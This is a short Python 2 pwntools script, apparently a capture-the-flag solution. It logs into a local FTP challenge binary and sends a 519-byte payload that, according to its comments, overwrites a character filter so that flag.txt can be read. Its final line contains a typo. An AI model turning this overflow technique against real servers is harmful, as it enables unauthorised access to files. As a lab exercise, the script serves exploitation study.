#Import pwntools
from pwn import *

#Start the server
server = process("./ftp_0319deb1c1c033af28613c57da686aa7")

#Connect to the server, and log in
target = remote("127.0.0.1", 12012)
target.recvline()
target.sendline("user blankwall")
target.recvline()
target.sendline("pass cookie")
target.recvline()

#Establish the first secondary remote connection to transfer the file
target.sendline("pasv")
p0 = target.recvline()
p0 = p0.replace("PASV succesful listening on port: ", "")
p0 = p0.replace("\n", "")
print "port 0 is: " + p0 
r0 = remote("127.0.0.1", p0)

#Transfer the file to write over the illegal character 'f'
target.sendline("stor pwn")
payload = "0"*519
r0.sendline(payload)
r0.close()
print target.recvuntil("transfer complete\n")

#Establish the secondary connection to retrieve the flag.txt file
target.sendline("pasv")
p1 = target.recvline()
p1 = p1.replace("PASV succesful listening on port: ", "")
p1 = p1.replace("\n", "")
print "port 1 is: " + p1 
r1 = remote("127.0.0.1", p1)

#Retrieve and print the flag.txt file
target.sendline("retr flag.txt")
print r1.recvline()
r1.interactive()

#Drop to an interactive prompt, and 
target,interactive()
#gdb.attach(server)